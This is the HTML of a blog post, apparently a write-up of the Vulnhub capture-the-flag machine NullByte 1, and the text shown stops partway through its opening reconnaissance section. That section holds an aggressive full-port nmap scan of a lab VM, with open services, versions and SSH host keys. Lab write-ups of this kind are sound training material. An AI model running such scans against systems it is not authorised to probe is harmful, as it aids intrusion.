@@ -1,0 +1,819 @@
+<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="Vulnhub - NullByte 1" /><meta property="og:locale" content="en" /><meta name="description" content="Recon NMAP Complete Scan ``` Nmap 7.92 scan initiated Thu Feb 3 18:22:24 2022 as: nmap -vv –reason -Pn -T4 -sV -sC –version-all -A –osscan-guess -p- -oN /root/vulnHub/NullByte/192.168.110.11/scans/_full_tcp_nmap.txt -oX /root/vulnHub/NullByte/192.168.110.11/scans/xml/_full_tcp_nmap.xml 192.168.110.11 adjust_timeouts2: packet supposedly had rtt of -991247 microseconds. Ignoring time. Nmap scan report for 192.168.110.11 Host is up, received arp-response (0.0013s latency). Scanned at 2022-02-03 18:22:37 +08 for 24s Not shown: 65531 closed tcp ports (reset) PORT STATE SERVICE REASON VERSION 80/tcp open http syn-ack ttl 64 Apache httpd 2.4.10 ((Debian)) | http-methods: |_ Supported Methods: POST OPTIONS GET HEAD |http-title: Null Byte 00 - level 1 |_http-server-header: Apache/2.4.10 (Debian) 111/tcp open rpcbind syn-ack ttl 64 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4 111/tcp6 rpcbind | 100000 3,4 111/udp6 rpcbind | 100024 1 34000/tcp6 status | 100024 1 40022/tcp status | 100024 1 41283/udp status | 100024 1 57154/udp6 status 777/tcp open ssh syn-ack ttl 64 OpenSSH 6.7p1 Debian 5 (protocol 2.0) | ssh-hostkey: | 1024 16:30:13:d9:d5:55:36:e8:1b:b7:d9:ba:55:2f:d7:44 (DSA) | ssh-dss AAAAB3NzaC1kc3MAAACBALLUIu4tXFadebYrnD994oq52RRYSpBO4UBHiXnGTGEgm6UlIDR8IT81T9RaJg5DjFIfjfzTfeIJVmDKMk2Zz/itniXKB7FRbF5Exyp4Vu2IzD76Iepu1qBmGrQdgtAwR+rCtu4KQ30KtCK48OvZO409Nbff8AB5ScuHePourSMVAAAAFQDbcAuY6E2l8runB/XMCs4kevsorQAAAIBlurtYJXxZFPdyfnVzCvGlp74pknTmM7BExEyU5tdJAGjPPF3+ApdNXk9b8cWKoKsGK++cEQgkZAuIgj9uso853WwS4NArT/P0j9cmqvKmMmClZWMFf/pXARoW9MsyZ9Eudo2TWBEgtqknVqStsSAp5UaxITyFCGoISaAJSpXtawAAAIEAnGErIK3lL2HxBvKbVJYpKdY9jjlsd+Ly8iPJW5m2BUXRDPVMU4kN5yhXfcK9Ls4W/SWApzj7zt5c5j3KixB8+pjpIMZqqnHbDcHbL1o+gPbwaSzeZVrHxnmCay3eWadclIykRadr3wdsnCa+6wSGEAW/1VbODQ4g84jRVj3iHCo= | 2048 29:aa:7d:2e:60:8b:a6:a1:c2:bd:7c:c8:bd:3c:f4:f2 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCk720eL8a5T2a7mSbBQm1Ga6mDBH354s4kS4YPzJdZDgpdsRpqyZtrYr09HxkOpdk2Qt5yVo8Wq0UCqGmcqSd5u8Zx36OjUp3gwKhyQD8HXfhr3Edp65wt3PY7jlEKyXrGiJPQWYCOJAxfRW+VzBM13EKRWjS+jlovyjz0/BJpdX/cehGTyg/YkOT98g2oiDZm8ydGmFHa1psATUf2/39NVA6ef6eL+WtrYRljiV7Bu4qrX+WU2DLCZy28SjA23m48I+Thy05pLZTgEYGeBAH6UbC+96DUyrSqbAF0I+OBPXNclrmSB956VdDOBe6RjSJsrO9bXUQbb5oT2XnjdTTB | 256 60:06:e3:64:8f:8a:6f:a7:74:5a:8b:3f:e1:24:93:96 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAkdg5B2LQmX+0vhiEavzVhKN0ZaU1e1Zi1ANcCmz5W63z65sBL6iRvzF+XNCW3dmsvsC1lRlLYDpj94RElY3ag= | 256 bc:f7:44:8d:79:6a:19:48:76:a3:e2:44:92:dc:13:a2 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINxwJ5299oAQPJtmnso4wAqIdz2ACkCMWsvxgf16XX/G 40022/tcp open status syn-ack ttl 64 1 (RPC #100024) MAC Address: 08:00:27:3C:BF:5C (Oracle VirtualBox virtual NIC) OS fingerprint not ideal because: Didn’t receive UDP response. Please try again with -sSU Aggressive OS guesses: Linux 3.2 - 4.9 (96%), Sony Bravia smart TV (Android) (93%), Linux 3.10 - 4.11 (93%), OpenWrt Chaos Calmer 15.05 (Linux 3.18) or Designated Driver (Linux 4.1 or 4.4) (93%), Sony Android TV (Android 5.0) (92%), Android 5.1 (92%), Linux 3.2 - 3.16 (92%), Linux 3.12 (92%), Android 4.0 (92%), Linux 3.13 (91%) No exact OS matches for host (test conditions non-ideal). TCP/IP fingerprint: SCAN(V=7.92%E=4%D=2/3%OT=80%CT=1%CU=%PV=Y%DS=1%DC=D%G=N%M=080027%TM=61FBAD05%P=x86_64-pc-linux-gnu) SEQ(SP=104%GCD=2%ISR=10C%TI=Z%CI=I%II=I%TS=8) OPS(O1=M5B4ST11NW6%O2=M5B4ST11NW6%O3=M5B4NNT11NW6%O4=M5B4ST11NW6%O5=M5B4ST11NW6%O6=M5B4ST11) WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120) ECN(R=N) ECN(R=Y%DF=Y%TG=40%W=7210%O=M5B4NNSNW6%CC=Y%Q=) T1(R=N) T1(R=Y%DF=Y%TG=40%S=O%A=O%F=AS%RD=0%Q=) T2(R=N) T3(R=N) T4(R=N) T4(R=Y%DF=Y%TG=40%W=0%S=O%A=Z%F=R%O=%RD=0%Q=) T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=) T6(R=N) T6(R=Y%DF=Y%TG=40%W=0%S=O%A=Z%F=R%O=%RD=0%Q=) T7(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=) U1(R=N) IE(R=Y%DFI=N%TG=40%CD=S)" /><meta property="og:description" content="Recon NMAP Complete Scan ``` Nmap 7.92 scan initiated Thu Feb 3 18:22:24 2022 as: nmap -vv –reason -Pn -T4 -sV -sC –version-all -A –osscan-guess -p- -oN /root/vulnHub/NullByte/192.168.110.11/scans/_full_tcp_nmap.txt -oX /root/vulnHub/NullByte/192.168.110.11/scans/xml/_full_tcp_nmap.xml 192.168.110.11 adjust_timeouts2: packet supposedly had rtt of -991247 microseconds. Ignoring time. Nmap scan report for 192.168.110.11 Host is up, received arp-response (0.0013s latency). Scanned at 2022-02-03 18:22:37 +08 for 24s Not shown: 65531 closed tcp ports (reset) PORT STATE SERVICE REASON VERSION 80/tcp open http syn-ack ttl 64 Apache httpd 2.4.10 ((Debian)) | http-methods: |_ Supported Methods: POST OPTIONS GET HEAD |http-title: Null Byte 00 - level 1 |_http-server-header: Apache/2.4.10 (Debian) 111/tcp open rpcbind syn-ack ttl 64 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4 111/tcp6 rpcbind | 100000 3,4 111/udp6 rpcbind | 100024 1 34000/tcp6 status | 100024 1 40022/tcp status | 100024 1 41283/udp status | 100024 1 57154/udp6 status 777/tcp open ssh syn-ack ttl 64 OpenSSH 6.7p1 Debian 5 (protocol 2.0) | ssh-hostkey: | 1024 16:30:13:d9:d5:55:36:e8:1b:b7:d9:ba:55:2f:d7:44 (DSA) | ssh-dss AAAAB3NzaC1kc3MAAACBALLUIu4tXFadebYrnD994oq52RRYSpBO4UBHiXnGTGEgm6UlIDR8IT81T9RaJg5DjFIfjfzTfeIJVmDKMk2Zz/itniXKB7FRbF5Exyp4Vu2IzD76Iepu1qBmGrQdgtAwR+rCtu4KQ30KtCK48OvZO409Nbff8AB5ScuHePourSMVAAAAFQDbcAuY6E2l8runB/XMCs4kevsorQAAAIBlurtYJXxZFPdyfnVzCvGlp74pknTmM7BExEyU5tdJAGjPPF3+ApdNXk9b8cWKoKsGK++cEQgkZAuIgj9uso853WwS4NArT/P0j9cmqvKmMmClZWMFf/pXARoW9MsyZ9Eudo2TWBEgtqknVqStsSAp5UaxITyFCGoISaAJSpXtawAAAIEAnGErIK3lL2HxBvKbVJYpKdY9jjlsd+Ly8iPJW5m2BUXRDPVMU4kN5yhXfcK9Ls4W/SWApzj7zt5c5j3KixB8+pjpIMZqqnHbDcHbL1o+gPbwaSzeZVrHxnmCay3eWadclIykRadr3wdsnCa+6wSGEAW/1VbODQ4g84jRVj3iHCo= | 2048 29:aa:7d:2e:60:8b:a6:a1:c2:bd:7c:c8:bd:3c:f4:f2 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCk720eL8a5T2a7mSbBQm1Ga6mDBH354s4kS4YPzJdZDgpdsRpqyZtrYr09HxkOpdk2Qt5yVo8Wq0UCqGmcqSd5u8Zx36OjUp3gwKhyQD8HXfhr3Edp65wt3PY7jlEKyXrGiJPQWYCOJAxfRW+VzBM13EKRWjS+jlovyjz0/BJpdX/cehGTyg/YkOT98g2oiDZm8ydGmFHa1psATUf2/39NVA6ef6eL+WtrYRljiV7Bu4qrX+WU2DLCZy28SjA23m48I+Thy05pLZTgEYGeBAH6UbC+96DUyrSqbAF0I+OBPXNclrmSB956VdDOBe6RjSJsrO9bXUQbb5oT2XnjdTTB | 256 60:06:e3:64:8f:8a:6f:a7:74:5a:8b:3f:e1:24:93:96 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAkdg5B2LQmX+0vhiEavzVhKN0ZaU1e1Zi1ANcCmz5W63z65sBL6iRvzF+XNCW3dmsvsC1lRlLYDpj94RElY3ag= | 256 bc:f7:44:8d:79:6a:19:48:76:a3:e2:44:92:dc:13:a2 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINxwJ5299oAQPJtmnso4wAqIdz2ACkCMWsvxgf16XX/G 40022/tcp open status syn-ack ttl 64 1 (RPC #100024) MAC Address: 08:00:27:3C:BF:5C (Oracle VirtualBox virtual NIC) OS fingerprint not ideal because: Didn’t receive UDP response. Please try again with -sSU Aggressive OS guesses: Linux 3.2 - 4.9 (96%), Sony Bravia smart TV (Android) (93%), Linux 3.10 - 4.11 (93%), OpenWrt Chaos Calmer 15.05 (Linux 3.18) or Designated Driver (Linux 4.1 or 4.4) (93%), Sony Android TV (Android 5.0) (92%), Android 5.1 (92%), Linux 3.2 - 3.16 (92%), Linux 3.12 (92%), Android 4.0 (92%), Linux 3.13 (91%) No exact OS matches for host (test conditions non-ideal). TCP/IP fingerprint: SCAN(V=7.92%E=4%D=2/3%OT=80%CT=1%CU=%PV=Y%DS=1%DC=D%G=N%M=080027%TM=61FBAD05%P=x86_64-pc-linux-gnu) SEQ(SP=104%GCD=2%ISR=10C%TI=Z%CI=I%II=I%TS=8) OPS(O1=M5B4ST11NW6%O2=M5B4ST11NW6%O3=M5B4NNT11NW6%O4=M5B4ST11NW6%O5=M5B4ST11NW6%O6=M5B4ST11) WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120) ECN(R=N) ECN(R=Y%DF=Y%TG=40%W=7210%O=M5B4NNSNW6%CC=Y%Q=) T1(R=N) T1(R=Y%DF=Y%TG=40%S=O%A=O%F=AS%RD=0%Q=) T2(R=N) T3(R=N) T4(R=N) T4(R=Y%DF=Y%TG=40%W=0%S=O%A=Z%F=R%O=%RD=0%Q=) T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=) T6(R=N) T6(R=Y%DF=Y%TG=40%W=0%S=O%A=Z%F=R%O=%RD=0%Q=) T7(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=) U1(R=N) IE(R=Y%DFI=N%TG=40%CD=S)" /><link rel="canonical" href="https://yufongg.github.io/posts/NullByte-1/" /><meta property="og:url" content="https://yufongg.github.io/posts/NullByte-1/" /><meta property="og:site_name" content="Yufong" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-01-31T00:00:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Vulnhub - NullByte 1" /><meta name="twitter:site" content="@yufongg" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-06-09T02:05:28+08:00","datePublished":"2022-01-31T00:00:00+08:00","description":"Recon NMAP Complete Scan ``` Nmap 7.92 scan initiated Thu Feb 3 18:22:24 2022 as: nmap -vv –reason -Pn -T4 -sV -sC –version-all -A –osscan-guess -p- -oN /root/vulnHub/NullByte/192.168.110.11/scans/_full_tcp_nmap.txt -oX /root/vulnHub/NullByte/192.168.110.11/scans/xml/_full_tcp_nmap.xml 192.168.110.11 adjust_timeouts2: packet supposedly had rtt of -991247 microseconds. Ignoring time. Nmap scan report for 192.168.110.11 Host is up, received arp-response (0.0013s latency). Scanned at 2022-02-03 18:22:37 +08 for 24s Not shown: 65531 closed tcp ports (reset) PORT STATE SERVICE REASON VERSION 80/tcp open http syn-ack ttl 64 Apache httpd 2.4.10 ((Debian)) | http-methods: |_ Supported Methods: POST OPTIONS GET HEAD |http-title: Null Byte 00 - level 1 |_http-server-header: Apache/2.4.10 (Debian) 111/tcp open rpcbind syn-ack ttl 64 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4 111/tcp6 rpcbind | 100000 3,4 111/udp6 rpcbind | 100024 1 34000/tcp6 status | 100024 1 40022/tcp status | 100024 1 41283/udp status | 100024 1 57154/udp6 status 777/tcp open ssh syn-ack ttl 64 OpenSSH 6.7p1 Debian 5 (protocol 2.0) | ssh-hostkey: | 1024 16:30:13:d9:d5:55:36:e8:1b:b7:d9:ba:55:2f:d7:44 (DSA) | ssh-dss AAAAB3NzaC1kc3MAAACBALLUIu4tXFadebYrnD994oq52RRYSpBO4UBHiXnGTGEgm6UlIDR8IT81T9RaJg5DjFIfjfzTfeIJVmDKMk2Zz/itniXKB7FRbF5Exyp4Vu2IzD76Iepu1qBmGrQdgtAwR+rCtu4KQ30KtCK48OvZO409Nbff8AB5ScuHePourSMVAAAAFQDbcAuY6E2l8runB/XMCs4kevsorQAAAIBlurtYJXxZFPdyfnVzCvGlp74pknTmM7BExEyU5tdJAGjPPF3+ApdNXk9b8cWKoKsGK++cEQgkZAuIgj9uso853WwS4NArT/P0j9cmqvKmMmClZWMFf/pXARoW9MsyZ9Eudo2TWBEgtqknVqStsSAp5UaxITyFCGoISaAJSpXtawAAAIEAnGErIK3lL2HxBvKbVJYpKdY9jjlsd+Ly8iPJW5m2BUXRDPVMU4kN5yhXfcK9Ls4W/SWApzj7zt5c5j3KixB8+pjpIMZqqnHbDcHbL1o+gPbwaSzeZVrHxnmCay3eWadclIykRadr3wdsnCa+6wSGEAW/1VbODQ4g84jRVj3iHCo= | 2048 29:aa:7d:2e:60:8b:a6:a1:c2:bd:7c:c8:bd:3c:f4:f2 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCk720eL8a5T2a7mSbBQm1Ga6mDBH354s4kS4YPzJdZDgpdsRpqyZtrYr09HxkOpdk2Qt5yVo8Wq0UCqGmcqSd5u8Zx36OjUp3gwKhyQD8HXfhr3Edp65wt3PY7jlEKyXrGiJPQWYCOJAxfRW+VzBM13EKRWjS+jlovyjz0/BJpdX/cehGTyg/YkOT98g2oiDZm8ydGmFHa1psATUf2/39NVA6ef6eL+WtrYRljiV7Bu4qrX+WU2DLCZy28SjA23m48I+Thy05pLZTgEYGeBAH6UbC+96DUyrSqbAF0I+OBPXNclrmSB956VdDOBe6RjSJsrO9bXUQbb5oT2XnjdTTB | 256 60:06:e3:64:8f:8a:6f:a7:74:5a:8b:3f:e1:24:93:96 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAkdg5B2LQmX+0vhiEavzVhKN0ZaU1e1Zi1ANcCmz5W63z65sBL6iRvzF+XNCW3dmsvsC1lRlLYDpj94RElY3ag= | 256 bc:f7:44:8d:79:6a:19:48:76:a3:e2:44:92:dc:13:a2 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINxwJ5299oAQPJtmnso4wAqIdz2ACkCMWsvxgf16XX/G 40022/tcp open status syn-ack ttl 64 1 (RPC #100024) MAC Address: 08:00:27:3C:BF:5C (Oracle VirtualBox virtual NIC) OS fingerprint not ideal because: Didn’t receive UDP response. Please try again with -sSU Aggressive OS guesses: Linux 3.2 - 4.9 (96%), Sony Bravia smart TV (Android) (93%), Linux 3.10 - 4.11 (93%), OpenWrt Chaos Calmer 15.05 (Linux 3.18) or Designated Driver (Linux 4.1 or 4.4) (93%), Sony Android TV (Android 5.0) (92%), Android 5.1 (92%), Linux 3.2 - 3.16 (92%), Linux 3.12 (92%), Android 4.0 (92%), Linux 3.13 (91%) No exact OS matches for host (test conditions non-ideal). TCP/IP fingerprint: SCAN(V=7.92%E=4%D=2/3%OT=80%CT=1%CU=%PV=Y%DS=1%DC=D%G=N%M=080027%TM=61FBAD05%P=x86_64-pc-linux-gnu) SEQ(SP=104%GCD=2%ISR=10C%TI=Z%CI=I%II=I%TS=8) OPS(O1=M5B4ST11NW6%O2=M5B4ST11NW6%O3=M5B4NNT11NW6%O4=M5B4ST11NW6%O5=M5B4ST11NW6%O6=M5B4ST11) WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120) ECN(R=N) ECN(R=Y%DF=Y%TG=40%W=7210%O=M5B4NNSNW6%CC=Y%Q=) T1(R=N) T1(R=Y%DF=Y%TG=40%S=O%A=O%F=AS%RD=0%Q=) T2(R=N) T3(R=N) T4(R=N) T4(R=Y%DF=Y%TG=40%W=0%S=O%A=Z%F=R%O=%RD=0%Q=) T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=) T6(R=N) T6(R=Y%DF=Y%TG=40%W=0%S=O%A=Z%F=R%O=%RD=0%Q=) T7(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=) U1(R=N) IE(R=Y%DFI=N%TG=40%CD=S)","headline":"Vulnhub - NullByte 1","mainEntityOfPage":{"@type":"WebPage","@id":"https://yufongg.github.io/posts/NullByte-1/"},"url":"https://yufongg.github.io/posts/NullByte-1/"}</script><title>Vulnhub - NullByte 1 | Yufong</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Yufong"><meta name="application-name" content="Yufong"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/Vulnhub/Linux/Bob 1.0.1/images/koko.jpg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Yufong</a></div><div class="site-subtitle font-italic">OSCP | Infosec Writeups</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/yufongg" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://www.youtube.com/watch?v=7hjHZOc-e4w" aria-label="youtube" target="_blank" rel="noopener"> <i class="fab fa-youtube"></i> </a> <a href="http://discordapp.com/users/175250797578158080" aria-label="discord" target="_blank" rel="noopener"> <i class="fab fa-discord"></i> </a> <a href="https://www.hackthebox.com/home/users/profile/834331" aria-label="hackthebox" target="_blank" rel="noopener"> <i class="fa fa-cube"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Vulnhub - NullByte 1</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1000 400'%3E%3C/svg%3E" data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/Vulnhub/Linux/NullByte 1/images/Nullbyte.png" class="preview-img bg" alt="nullbyte" width="1000" height="400" data-proofer-ignore><h1 data-toc-skip>Vulnhub - NullByte 1</h1><div class="post-meta text-muted"><div> By <em> <a href="https://github.com/yufongg">yufongg</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1643558400" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-01-31 </em> </span> <span> Updated <em class="timeago" data-ts="1749405928" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2025-06-09 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2445 words"> <em>13 min</em> read</span></div></div></div><div class="post-content"><h1 id="recon">Recon</h1><h2 id="nmap-complete-scan">NMAP Complete Scan <a href="#nmap-complete-scan" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+</pre><td class="rouge-code"><pre># Nmap 7.92 scan initiated Thu Feb  3 18:22:24 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /root/vulnHub/NullByte/192.168.110.11/scans/_full_tcp_nmap.txt -oX /root/vulnHub/NullByte/192.168.110.11/scans/xml/_full_tcp_nmap.xml 192.168.110.11
+adjust_timeouts2: packet supposedly had rtt of -991247 microseconds.  Ignoring time.
+Nmap scan report for 192.168.110.11
+Host is up, received arp-response (0.0013s latency).
+Scanned at 2022-02-03 18:22:37 +08 for 24s
+Not shown: 65531 closed tcp ports (reset)
+PORT      STATE SERVICE REASON         VERSION
+80/tcp    open  http    syn-ack ttl 64 Apache httpd 2.4.10 ((Debian))
+| http-methods: 
+|_  Supported Methods: POST OPTIONS GET HEAD
+|_http-title: Null Byte 00 - level 1
+|_http-server-header: Apache/2.4.10 (Debian)
+111/tcp   open  rpcbind syn-ack ttl 64 2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100024  1          34000/tcp6  status
+|   100024  1          40022/tcp   status
+|   100024  1          41283/udp   status
+|_  100024  1          57154/udp6  status
+777/tcp   open  ssh     syn-ack ttl 64 OpenSSH 6.7p1 Debian 5 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 16:30:13:d9:d5:55:36:e8:1b:b7:d9:ba:55:2f:d7:44 (DSA)
+| ssh-dss AAAAB3NzaC1kc3MAAACBALLUIu4tXFadebYrnD994oq52RRYSpBO4UBHiXnGTGEgm6UlIDR8IT81T9RaJg5DjFIfjfzTfeIJVmDKMk2Zz/itniXKB7FRbF5Exyp4Vu2IzD76Iepu1qBmGrQdgtAwR+rCtu4KQ30KtCK48OvZO409Nbff8AB5ScuHePourSMVAAAAFQDbcAuY6E2l8runB/XMCs4kevsorQAAAIBlurtYJXxZFPdyfnVzCvGlp74pknTmM7BExEyU5tdJAGjPPF3+ApdNXk9b8cWKoKsGK++cEQgkZAuIgj9uso853WwS4NArT/P0j9cmqvKmMmClZWMFf/pXARoW9MsyZ9Eudo2TWBEgtqknVqStsSAp5UaxITyFCGoISaAJSpXtawAAAIEAnGErIK3lL2HxBvKbVJYpKdY9jjlsd+Ly8iPJW5m2BUXRDPVMU4kN5yhXfcK9Ls4W/SWApzj7zt5c5j3KixB8+pjpIMZqqnHbDcHbL1o+gPbwaSzeZVrHxnmCay3eWadclIykRadr3wdsnCa+6wSGEAW/1VbODQ4g84jRVj3iHCo=
+|   2048 29:aa:7d:2e:60:8b:a6:a1:c2:bd:7c:c8:bd:3c:f4:f2 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCk720eL8a5T2a7mSbBQm1Ga6mDBH354s4kS4YPzJdZDgpdsRpqyZtrYr09HxkOpdk2Qt5yVo8Wq0UCqGmcqSd5u8Zx36OjUp3gwKhyQD8HXfhr3Edp65wt3PY7jlEKyXrGiJPQWYCOJAxfRW+VzBM13EKRWjS+jlovyjz0/BJpdX/cehGTyg/YkOT98g2oiDZm8ydGmFHa1psATUf2/39NVA6ef6eL+WtrYRljiV7Bu4qrX+WU2DLCZy28SjA23m48I+Thy05pLZTgEYGeBAH6UbC+96DUyrSqbAF0I+OBPXNclrmSB956VdDOBe6RjSJsrO9bXUQbb5oT2XnjdTTB
+|   256 60:06:e3:64:8f:8a:6f:a7:74:5a:8b:3f:e1:24:93:96 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAkdg5B2LQmX+0vhiEavzVhKN0ZaU1e1Zi1ANcCmz5W63z65sBL6iRvzF+XNCW3dmsvsC1lRlLYDpj94RElY3ag=
+|   256 bc:f7:44:8d:79:6a:19:48:76:a3:e2:44:92:dc:13:a2 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINxwJ5299oAQPJtmnso4wAqIdz2ACkCMWsvxgf16XX/G
+40022/tcp open  status  syn-ack ttl 64 1 (RPC #100024)
+MAC Address: 08:00:27:3C:BF:5C (Oracle VirtualBox virtual NIC)
+OS fingerprint not ideal because: Didn't receive UDP response. Please try again with -sSU
